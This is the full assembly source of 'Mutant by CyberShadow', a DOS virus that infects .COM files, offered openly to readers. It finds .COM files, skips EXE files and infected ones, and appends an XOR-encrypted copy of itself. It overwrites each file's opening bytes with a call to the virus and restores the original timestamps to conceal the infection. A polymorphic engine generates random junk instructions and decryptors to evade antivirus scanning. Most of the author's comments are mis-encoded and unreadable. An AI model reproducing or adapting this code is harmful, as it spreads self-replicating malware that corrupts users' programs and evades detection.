.model tiny
.code
org 100h
;--------------------------------------
;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;�                           Hallo, � 췅栒誓, �Ŋル!                           �
;�  뫅ㄵ� � 栒� 췅 ㄽ渟 쭬 ぎН�� � ��ㅳ쵟ギ刷 Л�, 溫 ���ギ若 〓ギ 〓 �졹稅�- �
;낍졻� 쥯�, ㄾ昔（� М� ㄵ獸囹�, �� 信循�⒰手� ��嶺�． ぎ玉졷� 꽑勝Œ�쥯, �.�. �
;끼ⓣ信� ��エМ雪��．, �� � 쭬�ㄽ� �昔ㄵМ�飡黍昔쥯筍 쥯� ⅲ� (˘說��) 昔ㄸМ．�
;나��... 뒶昔曄 췅�ⓤ젷 � 栒� ㄵ與レ�莘 �昔ｃ, 召ζ�� ㄻ� 쥯�! Enjoy it!       �
;�                                              CyberShadow...                 �
;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 롟獸昔┃�, 若筍 將� �昔짛 � �� 誓㎤ㄵ�狩좑 �췅 쭬�젲젰� 蓀젳� ㏇� 몠� �昔（
; � 收ゃ耀� ㄸ誓も�黍� (� ��キ臾 �恂呻聲��� ヮ〓� 졻循Æ呻��, 譽� 誠�쳽��
; 召ζ쯄レ��, 若舜 も� 쭬若曄�, ㏇� �젪�� ��誓ㄵ쳽β!)
;--------------------------------------
;듻�졻�, 쵟レ葉え � ㄵ¡囹�, Л� � ギщ 〓ギ �ⓤ졻� ���硫 ˘說� � � 誓㎯レ�졻�
;む�Д 젷．黍燧� ��エМ雪� ギ˘筍 � ��� �ε誓�. � 쥯耀-獸 ˘說� ぎ涉�硫 � 췅ㄾ
;〓 ⅲ� ��ㄽ�˘筍 >;-[~

Const1 = offset FreeByte - offset Start
Const2 = offset EndVirus - offset Start
Const3 = offset New_adr - offset Start

Begin:
        call start
;--------------------------------------
Start:
	sti
        cld
        pop DI
        mov BP,3
        sub DI,BP                    ;- DI=100h
        push DI
;      -------------------------------
	call new_adr
new_adr:
	pop si
        sub SI,Const3                ;� SI=Begin addres
        push SI                      ;�
;      -------------------------------
        add SI,Const1                ;�
        push SI                      ;�
        movsw                        ;� �쩺��ⓤ젷� 칛젪Œ彛瑜
        movsb                        ;�    �쩺�瑜 3 줎⒱�.
;      --------------------------------
        mov DX,SI                    ;�
        sub CX,CX                    ;� 췅獄� �쩺¡� º� �젵쳽.
        mov AH,4eh                   ;�
        int 21h                      ;�
        pop SI DI                    ;�
;--------------------------------------
Next:
        cmp word ptr ds:[9ah],60000  ;� ㄻÞ� ‘レ蜈 60000 줎⒱
        jna no_exit                  ;� 쩆-�猶젷Ð젰п�
yes_exit:
	jmp exit
no_exit:
        mov DX,80h+1eh               ;�
        mov AX,3d02h                 ;� �洙p維� �젵�.
        int 21h                      ;�
        jc yes_exit                  ;�
        mov BX,AX                    ;�
;      --------------------------------
        mov DX,SI                    ;�
        mov CX,BP                    ;� 葉�젰� �쩺�瑜 3 줎⒱�
        mov AH,3fh                   ;�
        int 21h                      ;�
;      --------------------------------
        cmp byte ptr ds:[si],0e8h    ;� �昔´黍п� 췅 쭬�젲���� (E8h-call)
        je close_file                ;� 쩆-�猶젷Ð젰п�
        cmp byte ptr ds:[si],'M'     ;� � �� EXE-鈺Ø エ � 췅�?
        je close_file                ;� 쩆-�猶젷Ð젰п�
        cmp byte ptr ds:[si],'Z'     ;� � �� EXE-鈺Ø エ � 췅�?
        je close_file                ;� 쩆-�猶젷Ð젰п�
        mov ax,5700h                 ;�
        int 21h                      ;� 貰魚젺Œ� №�э � 쩆栒 �젵쳽
        push dx                      ;�
        push cx                      ;�
        mov AL,2                     ;�
        call Proc1                   ;� �쩺�Д飡Œⓤ�
        sub SI,BP                    ;�  췅 ぎ�ζ �.
        sub AX,BP                    ;�
        mov [SI+1],AX                ;�
        push si di bx bp             ;뫌魚젺º 誓（
        mov si,di                    ;�洙蝨� □졻� ぎ� ˘黍�
        mov di, 62000                ;ゃㅻ ⅲ� 貰쥯筍 � �㎖�졻��� ˘ㄵ
        mov cx,const2                ;첓ぎ� ㄻÞ�
        call mutant                  ;М雪��� ⅲ�
        pop bp bx di si              ;¡遜�젺�˘� 誓（
;      --------------------------------
        mov AH,40h                   ;� 쭬�ⓤ젷� 收ギ ˘說��
        int 21h                      ;�
;      --------------------------------
        mov AL,0                     ;� �쩺�Д飡Œⓤ�
        call Proc1                   ;� 췅 췅�젷� �젵쳽
;      --------------------------------
        mov DX,SI                    ;�
        mov CX,BP                    ;� ��飡젪Œ� call 췅 ˘說�
        mov AH,40h                   ;� � 췅�젷� �젵쳽
        int 21h                      ;�
;      --------------------------------
        pop cx                       ;� ¡遜�젺�˘エ №�э � 쩆栒
        pop dx                       ;�
        mov ax,5701h                 ;�
        int 21h                      ;�
        add si,bp
close_file:
        sub si,bp
        mov AH,3eh                   ;� 쭬챥維� �젵�
        int 21h                      ;�
;      --------------------------------
        add SI,BP                    ;�
        mov AH,4fh                   ;�
        int 21h                      ;� 笹ⅳ莘蟯� �젵�
        jc exit                      ;�
	jmp next
;--------------------------------------
exit:
	ret
        db 'Mutant by CyberShadow...' ; ㄵ與レ�硫 ぎ�ⓣ젵�
;--------------------------------------
Proc1:
        sub DX,DX                    ;- 듽褻�� � �젵�
        sub CX,CX                    ;
        mov AH,42h                   ;
        int 21h                      ;
        ret                          ;
;--------------------------------------
;뮔�, М� ��エМ雪 �漱①젰恂� 笹ⅳ莘耀� �貰‥���飡溢: 笹晨젵�瑜 ぎ쵟�ㅻ ��
;�㎚��禎� 誓（飡昔�, 譽� ��㎖�エギ 承昔飡ⓥ� 젷．黍燧 � �젳���□젳ⓥ� 췅‘�
;ぎК젺�, 若舜 � 承昔飡Œ� 췅若┐���� ˘說��

mutant:
        call m_adress                ;�짛, �젹�� Þ收誓說��!
m_adress:
        pop bp                       ;렞誓ㄵエ� 췅�. 젮誓�
	push di cx si di
        in al,40h                    ;뿥� ▲ㄵ� め�黍筍
	mov cs:[bp+offset cr_1-offset m_adress-1],al
	mov si,bp
        add si,offset crypted-offset m_adress ;렞誓ㄵエエ 젮誓� 췅 �졹鼇菴��蟯�
        mov al,0e8h                  ;뇿�ⓨ젷� CALL 췅 �졹鼇菴��蟯�
	stosb
	mov ax,const2+2
	stosw
        mov cs:[bp+offset tmp_1-offset m_adress],di ;� 쭬��ЛŒ� ゃ쩆 稅쳽ㅻ쥯筍 쭬鼇菴�쥯�硫 ˘說�
	
        add di,const2+2              ;純め, 收��閃 М雪��� �졹鼇菴��蟯�
crypted_1:
	call poly
	lodsb
	or al,al
	je crypted_cs_1
crypted_cs:
	movsb
	dec al
	jne crypted_cs
	jmp short crypted_1
crypted_cs_1:
        push di
	movsw
	movsb
	call poly
	movsb
	call poly

        movsw            ;add ah,0 ㄾ줎˘オ� � め�黍オ�
        push si
        call rnd
        pop si
        stosb
        mov cs:[bp+offset add_crypt-offset m_adress],al
        inc si

	call poly
	movsb
	mov cx,di
	pop bx
	sub cx,bx
	mov al,255
	sub al,cl
	stosb
	inc si
	call poly
	movsw

	pop bx
	pop si cx
        pop dx
        push di                ;삩菴젺�� 收ギ ˘說��
        mov di,cs:[bp+offset tmp_1-offset m_adress]
        mov ah,cs:[bp+offset cr_1-offset m_adress-1]
crypt_body:
	lodsb
	xor al,ah
        add ah,cs:[bp+offset add_crypt-offset m_adress]
        stosb
	loop crypt_body
        pop di
	mov ax,di
	sub ax,dx
        mov cx,ax
	ret
poly:
	push si bx ax cx
	call rnd
	and bx,15
	inc bl
	xor ch,ch
	mov cl,bl
poly_1:
	push cx
	call rnd
	and bx,15
	shl bx,1
	call poly_2
poly_start:                     ;췅‘� ∥�ぎ� ぎК젺�(�η獸, ぎК젺� ��� Nㅶ졻� ��ャ�젰恂�!)
	dw offset block_0-offset poly_start
	dw offset block_1-offset poly_start
	dw offset block_2-offset poly_start
	dw offset block_3-offset poly_start
	dw offset block_4-offset poly_start
	dw offset block_5-offset poly_start
	dw offset block_6-offset poly_start
	dw offset block_7-offset poly_start
	dw offset block_8-offset poly_start
	dw offset block_9-offset poly_start
	dw offset block_10-offset poly_start
	dw offset block_11-offset poly_start
	dw offset block_12-offset poly_start
	dw offset block_13-offset poly_start
	dw offset block_14-offset poly_start
	dw offset block_15-offset poly_start
poly_2:
	pop si
	mov bx,cs:[si+bx]
	add bx,si
	call bx
	pop cx
	loop poly_1	
	pop cx ax bx si
	mov byte ptr cs:[bp+offset no_flag-offset m_adress],0
	ret
block_0:
	mov ax,00ebh
	stosw
	ret
block_1:
	mov al,8bh
	stosb
	call rnd
	and al,7
	mov bl,al
	shl al,3
	add al,bl
	add al,0c0h
	stosb
	ret
block_2:
	call rnd
	and al,7
	add al,50h
	stosb
	add al,8
	stosb
	ret
block_3:
	mov ax,90cch
	stosw
	ret
no_flags_set:
	push si
	call rnd
	pop si
	and bx,3
	shl bx,1
	mov bx,cs:[si+bx]
	add bx,si
	call bx
	ret
block_4:
	cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
	mov al,81h
	stosb
	call rnd
	and al,7
	add al,0f8h
	stosb
	call rnd
	mov ah,al
	call rnd
	stosw
	ret
block_5:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
	mov al,81h
	stosb
	call rnd
	and al,7
        add al,0e0h
	stosb
        mov ax,65535
        stosw
	ret
block_6:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
        mov al,81h
	stosb
	call rnd
	and al,7
        push ax
        add al,0e8h
	stosb
	call rnd
	mov ah,al
	call rnd
	stosw
	mov bx,ax
        mov al,81h
        stosb
        pop ax
        add al,0c0h
        stosb
	mov ax,bx
        stosw
        ret
block_7:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
	jne no_flags_set
	call rnd
	and al,7
        add al,40h
        stosb
        add al,8
        stosb
        ret
block_8:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_8
        jmp no_flags_set
flags_set_8:
        mov cl,3bh
	call rnd
	cmp ax,127
	ja short flags_set_8_1
	mov cl,3ah
flags_set_8_1:
	mov al,cl
        stosb
        call rnd
        and al,63
        add al,0c0h
        stosb
        ret
block_9:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_9
        jmp no_flags_set
flags_set_9:
        mov al,0bh
        stosb
        call rnd
        and al,7
        mov bl,al
        shl al,3
        add al,bl
        add al,0c0h
        stosb
        ret
block_10:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_10
        jmp no_flags_set
flags_set_10:
        call rnd
        and bx,7
        call block_10_1
        db 0f5h,0f8h,0f9h,0fah,0fch,0fdh,90h,0cch
block_10_1:
        pop si
        mov al,cs:[si+bx]
        stosb
        ret
block_11:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_11
        jmp no_flags_set
flags_set_11:
        mov al,0ah
	stosb
	call rnd
	and ax,7
	mov bl,al
	shl al,3
	add al,bl
        add al,0c0h
	stosb
        ret
block_12:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_12
        jmp no_flags_set
flags_set_12:
        mov al,85h
flags_set_1213:
        stosb
        call rnd
        and ax,63
        add al,0c0h
        stosb
        ret
block_13:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_13
        jmp no_flags_set
flags_set_13:
        mov al,84h
        jmp short flags_set_1213
block_14:
        cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
        je flags_set_14
        jmp no_flags_set
flags_set_14:
	mov al,80h
	stosb
	call rnd
	and al,07h
	add al,0e0h
	stosb
	mov al,0ffh
	stosb
        ret
block_15:
	jmp block_10
rnd:
	call rnd_1
	db 103
	db 220
	db 30
rnd_1:
	pop si
	mov al,cs:[si]
	add al,cs:[si+1]
	mov cs:[si],al
	add al,cs:[si+2]
	mov cs:[si+1],al
	ror al,1
	mov cs:[si+2],al
	xor bh,bh
	mov bl,al
	ret
crypted:                        ;貰■手���� �졹鼇菴��蟯�
	db 3
        mov cx,Const2           ;3 -ㄻÞ� ぎК젺�
	db 1
        pop si                  ;1
	db 2
        xor bp,bp               ;2
	db 2
        mov ah,0                ;2
cr_1:
	db 0
cr_3:
        xor cs:[bp+si],ah       ;3
        inc bp                  ;1
        add ah,0                ;3
        loop cr_3               ;2
	jmp si			;2
no_flag db 0
add_crypt db 0
tmp_1 dw 0
Jump:           call Begin           ;- 將� ▲ㄵ� 쭬�ⓤ젺� � 췅�젷� �昔（
FreeByte:       nop                  ;� � 將� Д飡� ��� ��舒瑜 3 줎⒱� �昔（
                nop                  ;�
                ret                  ;�
Fname           db '*.com',0         ; 쵟稅� �젵쳽

EndVirus:                            ; � 뱫� !!!!
;--------------------------------------
end begin
